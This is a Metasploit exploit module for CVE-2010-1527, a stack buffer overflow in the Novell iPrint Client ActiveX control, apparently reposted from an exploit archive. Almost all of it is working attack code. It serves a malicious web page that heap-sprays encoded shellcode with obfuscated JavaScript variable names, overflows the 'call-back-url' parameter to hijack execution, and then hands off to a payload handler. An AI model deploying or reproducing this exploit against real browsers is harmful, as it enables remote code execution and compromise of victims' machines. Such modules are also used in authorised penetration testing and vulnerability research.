Novell iPrint Client ActiveX Control call-back-url Buffer Overflow
==================================================================

##
# novelliprint_callbackurl.rb
#
# Novell iPrint Client ActiveX Control call-back-url Buffer Overflow exploit for the Metasploit Framework
#
# Exploit successfully tested on the following platforms:
#  - Novell iPrint Client 5.40 on Internet Explorer 7, Windows XP SP3
#  - Novell iPrint Client 5.42 on Internet Explorer 7, Windows XP SP3
#  - Novell iPrint Client 5.42 on Internet Explorer 7, Windows Vista SP2
#
# ienipp.ocx version tested:
# File Version: 5.4.0.0 and 5.4.2.0
# ClassID: 36723F97-7AA0-11D4-8919-FF2D71D0D32C
# RegKey Safe for Script: True
# RegKey Safe for Init: True
# KillBitSet: False
#
# References:
#  - CVE-2010-1527
#  - OSVDB 67411
#  - http://secunia.com/secunia_research/2010-104/ - Original advisory by Carsten Eiram, Secunia Research
#  - http://www.exploit-db.com/exploits/15042/ - MOAUB #19 exploit
#  - http://www.exploit-db.com/moaub-19-novell-iprint-client-browser-plugin-call-back-url-stack-overflow/ - MOAUB #14 binary analysis
#  - http://www.rec-sec.com/2010/09/21/novell-iprint-callbackurl-buffer-overflow-exploit/ - Metasploit exploit by Trancer, Recognize-Security
#
# Trancer
# http://www.rec-sec.com
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Novell iPrint Client ActiveX Control call-back-url Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack-based buffer overflow in Novell iPrint Client 5.42.
                    When sending an overly long string to the &#039;call-back-url&#039; parameter in an
                    op-client-interface-version action of ienipp.ocx an attacker may be able to
                    execute arbitrary code.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [ &#039;Trancer <mtrancer[at]gmail.com&#039; ],
            &#039;Version&#039;        => &#039;$Revision:$&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2010-1527&#039; ],
                    [ &#039;OSVDB&#039;, &#039;67411&#039;],
                    [ &#039;URL&#039;, &#039;http://secunia.com/secunia_research/2010-104/&#039; ], # Carsten Eiram, Secunia Research
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/15042/&#039; ],     # MOAUB #19
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;         => 1024,
                    &#039;BadChars&#039;      => "\x00",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows XP SP0-SP2 / Windows Vista / IE 6.0 SP0-SP2 / IE 7&#039;, { &#039;Ret&#039; => 0x0A0A0A0A } ]
                ],
            &#039;DisclosureDate&#039; => &#039;Aug 20 2010&#039;,
            &#039;DefaultTarget&#039;  => 0))
    end
 
    def autofilter
        false
    end
 
    def check_dependencies
        use_zlib
    end
 
    def on_request_uri(cli, request)
        # Re-generate the payload.
        return if ((p = regenerate_payload(cli)) == nil)
 
        # Encode the shellcode.
        shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
         
        # Setup exploit buffers
        nops      = Rex::Text.to_unescape([target.ret].pack(&#039;V&#039;))
        ret       = [target.ret].pack(&#039;V&#039;)
        ret       = ret * 250
        blocksize = 0x40000
        fillto    = 500
        offset    = target[&#039;Offset&#039;]
         
        # ActiveX parameters
        clsid   = "36723F97-7AA0-11D4-8919-FF2D71D0D32C"
 
        # Randomize the javascript variable names
        ienipp       = rand_text_alpha(rand(100) + 1)
        j_shellcode  = rand_text_alpha(rand(100) + 1)
        j_nops       = rand_text_alpha(rand(100) + 1)
        j_ret        = rand_text_alpha(rand(100) + 1)
        j_headersize = rand_text_alpha(rand(100) + 1)
        j_slackspace = rand_text_alpha(rand(100) + 1)
        j_fillblock  = rand_text_alpha(rand(100) + 1)
        j_block      = rand_text_alpha(rand(100) + 1)
        j_memory     = rand_text_alpha(rand(100) + 1)
        j_counter    = rand_text_alpha(rand(30) + 2)
 
        html = %Q|<html>
<script>
var #{j_shellcode} = unescape(&#039;#{shellcode}&#039;);
var #{j_nops} = unescape(&#039;#{nops}&#039;);
var #{j_headersize} = 20;
var #{j_slackspace} = #{j_headersize} + #{j_shellcode}.length;
while (#{j_nops}.length < #{j_slackspace}) #{j_nops} += #{j_nops};
var #{j_fillblock} = #{j_nops}.substring(0,#{j_slackspace});
var #{j_block} = #{j_nops}.substring(0,#{j_nops}.length - #{j_slackspace});
while (#{j_block}.length + #{j_slackspace} < #{blocksize}) #{j_block} = #{j_block} + #{j_block} + #{j_fillblock};
var #{j_memory} = new Array();
for (#{j_counter} = 0; #{j_counter} < #{fillto}; #{j_counter}++) {
    #{j_memory}[#{j_counter}] = #{j_block} + #{j_shellcode};
}
</script>
<object classid=&#039;clsid:#{clsid}&#039; id=&#039;#{ienipp}&#039;>
<param name=&#039;operation&#039; value=&#039;op-client-interface-version&#039; /> 
<param name=&#039;result-type&#039; value=&#039;url&#039; /> 
<param name=&#039;call-back-url&#039; value=&#039;#{ret}&#039; />
</object>
</html>|
 
        print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")
 
        # Transmit the response to the client
        send_response(cli, html, { &#039;Content-Type&#039; => &#039;text/html&#039; })
 
        # Handle the payload
        handler(cli)
    end
 
end



